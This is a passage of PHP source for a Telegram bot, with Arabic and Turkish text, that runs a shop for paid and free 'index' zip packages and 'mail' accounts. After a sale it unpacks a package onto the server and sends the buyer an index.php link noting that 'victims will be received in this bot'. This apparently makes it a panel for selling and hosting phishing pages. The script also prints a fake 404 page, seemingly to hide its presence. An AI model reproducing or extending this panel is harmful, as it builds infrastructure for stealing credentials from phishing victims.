$sales['mail']['plus'][$acount]['coin'] = $text;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailplusphoto");
		}
		if($photo and  $sting == "addmailplusphoto"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان طرق الدفع 💰
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['mail']['plus'];
$sales['mail']['plus'][$acount]['photo'] = $photo_id;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailplusbank");
	}
	if($text and $sting == "addmailplusbank"){
	$acount = $sales['all']['mail']['plus'];
		$name2 = $sales['mail']['plus'][$acount]['name'];
		$h = $sales['mail']['plus'][$acount]['coin'];
		$a = str_replace('÷÷÷',"\n",$sales['mail']['plus'][$acount]['aboud']);
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	تم الحفظ بنجاح ✅
	رقم الhesap : $acount
	نوع الhesap : $name2
	الوصف : $a
	السعر : $h
	طرق الدفع : $text
	",'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])
]);
$acount = $sales['all']['mail']['plus'];
$a = str_replace("\n",'÷÷÷',$text);
$sales['mail']['plus'][$acount]['pro'] = $a;
$sales['all']['mail']['plus'] += 1;
$sales['mail']['plus'][$acount]['user'] = $username;
add($sales);
unlink("yhya/sting$from_id.txt");
	}
	
				if($text == "dizin 📁"){
					bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	اختر نوع الdizin الان 😻
	",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"مجاني 🎁"],['text'=>"مدفوع 💲"]
],
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true
])
]);
				}
				
					if($text == "مجاني 🎁"){
					
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان نوع الdizin 😍
	",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true
])
]);
$acount = $sales['all']['index']['free'];
file_put_contents("yhya/sting$from_id.txt","addindexfree");

}
if($text != "İptal ❌"and $sting == "addindexfree"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان وصف الdizin 💌
	",'reply_to_message_id'=>$message_id,
	'resize_keyboard'=>true
]);
$acount = $sales['all']['index']['free'];
$sales['index']['free'][$acount]['ok'] = true;
$sales['index']['free'][$acount]['name'] = $text;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexfreeaboud");
	}
				if($text and $sting == "addindexfreeaboud"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان سعر الdizin 💌
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['index']['free'];
$a = str_replace("\n",'÷÷÷',$text);
$sales['index']['free'][$acount]['aboud'] = $a;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexfreecoin");
	}
	if(is_numeric($text) and $sting == "addindexfreecoin"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان صورة الdizin 💌
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['index']['free'];
$sales['index']['free'][$acount]['coin'] = $text;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexfreephoto");
	}
	if($photo and $sting == "addindexfreephoto"){
		$acount = $sales['all']['index']['free'];
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان الdizin ك zip ويجب انو يكون اسمه فريد
	",'reply_to_message_id'=>$message_id,
]);
$sales['index']['free'][$acount]['photo'] = $photo_id;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexfreezip");
	}
	$indexa = explode("\n",file_get_contents("yhya/indexname"));
	if($file and $sting == "addindexfreezip"){
	if(!in_array($message->document->file_name,$indexa)){
	$acount = $sales['all']['index']['free'];
		$name2 = $sales['index']['free'][$acount]['name'];
		$h = $sales['index']['free'][$acount]['coin'];
		$a = str_replace('÷÷÷',"\n",$sales['index']['free'][$acount]['aboud']);
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	تم الحفظ بنجاح ✅
	رقم الdizin : $acount
	نوع الdizin : $name2
	الوصف : $a
	السعر : $h
	",'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])
]);

$acount = $sales['all']['index']['free'];
$as = $file->file_name;
$sales['index']['free'][$acount]['zip'] = $as;
$sales['all']['index']['free'] += 1;
add($sales);
$file = "https://api.telegram.org/file/bot".API_KEY."/".bot('getfile',['file_id'=>$message->document->file_id])->result->file_path;
	    file_put_contents("yhya/".$message->document->file_name,file_get_contents($file));
	file_put_contents("yhya/indexname","$as"."\n",FILE_APPEND);
unlink("yhya/sting$from_id.txt");
	}else{
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	Üzgünüz, bu dosya adı kesinlikle var
	"]);
	}
	}
if($text == "مدفوع 💲"){
					bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان نوع الdizin 😍
	",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true
])
]);
$acount = $sales['all']['index']['plus'];
file_put_contents("yhya/sting$from_id.txt","addindexplus");

}
if($text != "İptal ❌"and $sting == "addindexplus"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان وصف الdizin 💌
	",'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true])
]);
$acount = $sales['all']['index']['plus'];
$sales['index']['plus'][$acount]['ok'] = true;
$sales['index']['plus'][$acount]['name'] = $text;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexplusaboud");
	}
				if($text and $sting == "addindexplusaboud"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان سعر الdizin 💌
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['index']['plus'];
$a = str_replace("\n",'÷÷÷',$text);
$sales['index']['plus'][$acount]['aboud'] = $a;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexpluscoin");
	}
	if($text and $sting == "addindexpluscoin"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان صورة الdizin 💌
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['index']['plus'];
$sales['index']['plus'][$acount]['coin'] = $text;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexplusphoto");
	}
	if($photo and $sting == "addindexplusphoto"){
	$acount = $sales['all']['index']['plus'];
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان طرق الدفع 💰
	",'reply_to_message_id'=>$message_id,
]);
$sales['index']['plus'][$acount]['photo'] = $photo_id;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexplusbank");
	}
	if($text and $sting == "addindexplusbank"){
		$acount = $sales['all']['index']['plus'];
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان الdizin ك zip ويجب انو يكون اسمه فريد
	",'reply_to_message_id'=>$message_id,
]);
$a = str_replace("\n",'÷÷÷',$text);
$sales['index']['plus'][$acount]['pro'] = $a;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addindexpluszip");
	}
	$indexa = explode("\n",file_get_contents("yhya/indexname"));
	if($file and $sting == "addindexpluszip"){
	if(!in_array($message->document->file_name,$indexa)){
	$acount = $sales['all']['index']['plus'];
		$name2 = $sales['index']['plus'][$acount]['name'];
		$h = $sales['index']['plus'][$acount]['coin'];
		$a = str_replace('÷÷÷',"\n",$sales['index']['plus'][$acount]['aboud']);
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	تم الحفظ بنجاح ✅
	رقم الdizin : $acount
	نوع الdizin : $name2
	الوصف : $a
	السعر : $h
	",'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])
]);

$acount = $sales['all']['index']['plus'];
$as = $file->file_name;
$sales['index']['plus'][$acount]['zip'] = $as;
$sales['all']['index']['plus'] += 1;
add($sales);
$file = "https://api.telegram.org/file/bot".API_KEY."/".bot('getfile',['file_id'=>$message->document->file_id])->result->file_path;
	    file_put_contents("yhya/".$message->document->file_name,file_get_contents($file));
	file_put_contents("yhya/indexname","$as"."\n",FILE_APPEND);
unlink("yhya/sting$from_id.txt");
	}else{
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	Üzgünüz, bu dosya adı kesinlikle var
	"]);
	}
	}
if($text == "gösteriyi kaldır ➖"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	Kaldırılacak teklif türünü seçin ➖
	",
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>'ücretsiz e-posta 💌','callback_data'=>"a#mail#free"],['text'=>'ücretli e-posta 💌','callback_data'=>"a#mail#plus"]],
[['text'=>'ücretsiz dizin 📁','callback_data'=>"a#index#free"],['text'=>'Ücretli Dizin 📁','callback_data'=>"a#index#plus"]],
]])
]);
	}
	$data = $update->callback_query->data;
$chat_id2 = $update->callback_query->message->chat->id;
$sid = $update->callback_query->message->message_id;
	$ex = explode("#",$data);
	if($ex[0] == "a"){
		if($ex[1] == 'index'){
			$what =  "dizin";
			}else{
				$what = "hesap ";
				}
				bot('EditMessageText',[
        'chat_id'=>$chat_id2,
        'message_id'=>$sid,
        'text'=>"
        أرسل الان رقم ال$what لاقوم بحذفه من العروض
        "]);
        file_put_contents("yhya/sting$chat_id2.txt","ok-$ex[1]-$ex[2]");
}
	
$b = explode("-",$sting);
if($b[0] == "ok" and is_numeric($text)){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	تمت الازالة بنجاح
	",'reply_to_message_id'=>$message_id,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])]);
	unset($sales[$b[1]][$b[2]][$text]);
	add($sales);
	unlink("yhya/sting$from_id.txt");
	}
if($text == "نقاط الدعوة 🔁"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل عدد نقاط رابط الدعوة
	" ,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])]);
	file_put_contents("yhya/sting$from_id.txt","nkat0");
	}
if($sting == "nkat0" and is_numeric($text)){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	تم حفظ عدد النقاط 
	",'reply_to_message_id'=>$message_id,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])]);
	$sales['nkat'] = $text;
	add($sales);
	unlink("yhya/sting$from_id.txt");
	}
if($text == "günlük puan 📅"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل عدد نقاط الهدية اليومية 💰
	" ,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])]);
	file_put_contents("yhya/sting$from_id.txt","nkatday");
	}
if($sting == "nkatday" and is_numeric($text)){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	تم حفظ عدد نقاط الهدية اليومي
	",'reply_to_message_id'=>$message_id,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])]);
	$sales['day'] = $text;
	add($sales);
	unlink("yhya/sting$from_id.txt");
	}
	if($text == "نقاط للكل 🎁"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل عدد النقاط لارسلها لمشتركين البوت
	" ,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])
]);
	file_put_contents("yhya/sting$from_id.txt","nkatall");
	}
if($sting == "nkatall" and is_numeric($text)){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
	file_get_contents($url."send.php?Type=all&Id=$text");
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	تم الارسال ✅
	",'reply_to_message_id'=>$message_id,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])]);
	unlink("yhya/sting$from_id.txt");
	}
	if($text == "Transfer Komisyonu 🔁"){
		bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل عدد النقاط التي سيتم خصمها مقابل تحويل نقاط من شخص لاخر ➖💰
	" ,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])
]);
	file_put_contents("yhya/sting$from_id.txt","nkatsendpeople");
		}
		if($sting == "nkatsendpeople" and is_numeric($text)){
			bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	Transfer komisyonu başarıyla kaydedildi ✅
	",'reply_to_message_id'=>$message_id,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])]);
	unlink("yhya/sting$from_id.txt");
	$sales['sendid'] = $text;
	add($sales);
	}
	if($text == "Destek olmak 📁"){
		if($from_id == $admin){
		 $idds = bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	Dosyaların bir kopyasını oluşturma
	",'reply_to_message_id'=>$message_id,
])->result->message_id;
function SAIEDZip($SAIEDZip1, $SAIEDZip2){
$SAIEDZip4 = realpath($SAIEDZip1);
$SAIEDZip = new ZipArchive();
$SAIEDZip->open($SAIEDZip2, ZipArchive::CREATE | ZipArchive::OVERWRITE);
$SAIEDZip3 = new RecursiveIteratorIterator(
new RecursiveDirectoryIterator($SAIEDZip4),
RecursiveIteratorIterator::LEAVES_ONLY);
foreach($SAIEDZip3 as $SAIEDZip5 => $SAIEDZip6){
if(!$SAIEDZip6->isDir()){
$SAIEDZip7 = $SAIEDZip6->getRealPath();
$SAIEDZip8 = substr($SAIEDZip7, strlen($SAIEDZip4) + 1);
$SAIEDZip->addFile($SAIEDZip7, $SAIEDZip8);
}}
$SAIEDZip->close();
}
# كود حجم الملف لـ @MrDGSY #
function SAIEDZip1($SAIEDZip9, $SAIEDZip10 = 2){
$SAIEDZip11=array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
$SAIEDZip12=floor((strlen($SAIEDZip9) - 1) / 3);
return sprintf("%.{$SAIEDZip10}f", $SAIEDZip9 / pow(1024, $SAIEDZip12)) . @$SAIEDZip11[$SAIEDZip12];
}
SAIEDZip('yhya/',"Backup.zip");
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$idds,
]);
$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
bot('senddocument',[
'chat_id'=>$chat_id,
'document'=>$url."Backup.zip",
'caption'=>"
Lütfen efendim geliştirici 🎁 Bu dosyaların bir kopyasıdır
",
'reply_to_message_id'=>$SAIEDZip18,
]);
unlink("Backup.zip");
}
		}
if($text == "Ücretli Dizin ⚡"){
	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'🔢┇Kölelik ','callback_data'=>'s'],['text'=>'ℹ️┇İsim ','callback_data'=>'s']];
  foreach($sales['index']['plus'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$code,'callback_data'=>"$code&%&ok"],['text'=>$sale['name'],'callback_data'=>"$code&%&ok"]];
  }
  $reply_markup = json_encode($reply_markup);
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	Size yüklemek için dizin numarasını seçin ☺
	",
	'reply_markup'=>($reply_markup)
	]);
	}
$ap = explode("&%&",$data);
if($ap[1] == "ok"){
	bot('EditMessageText',[
        'chat_id'=>$chat_id2,
        'message_id'=>$sid,
        'text'=>"
        Şimdi kişinin İD gönder 🆔 onun adına kaldırsın ✳
        
        "]);
        file_put_contents("yhya/sting$chat_id2.txt","ok@$ap[0]");
	}
$yhyasyrianhloobot = explode("@",$sting);
if($yhyasyrianhloobot[0] == "ok" and $text){
	$index[$text]['index'] += 1;
					index($index);
					mkdir("$text/".$index[$text]['index']);
					$zipname = 'yhya/'.$sales['index']['plus'][$yhyasyrianhloobot[1]]['zip'];
  $zip = new ZipArchive; 
if ($zip->open($zipname) === TRUE) { 
    $zip->extractTo(__DIR__."/$text/".$index[$text]['index']); 
    $zip->close(); 
}
$urll = $url."$text/".$index[$text]['index']."/index.php";
	bot('sendmessage',[
	'chat_id'=>$text, 
	'text' =>"
	Ücretli Endeks Satın Alındı 📁
	Bağlantı : $urll
	Not :
Kurbanlar bu botta alınacak 💘
	",'reply_to_message_id'=>$message_id,
]);
bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	Dizin başarıyla yürütüldü ✅
	Bağlantı : $urll
	Not :
Kurbanlar bu botta alınacak 💘
	",'reply_to_message_id'=>$message_id,
]);
unlink("yhya/sting$from_id.txt");
	}
echo '<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>
404 Not Found
</title>
</head>
<body bgcolor="white">
<h1>
Not Found
</h1>
The resource requested could not be found on this server.
<br>
<hr>
Web Server at Sniperqsd.tk
</body>
</html>';


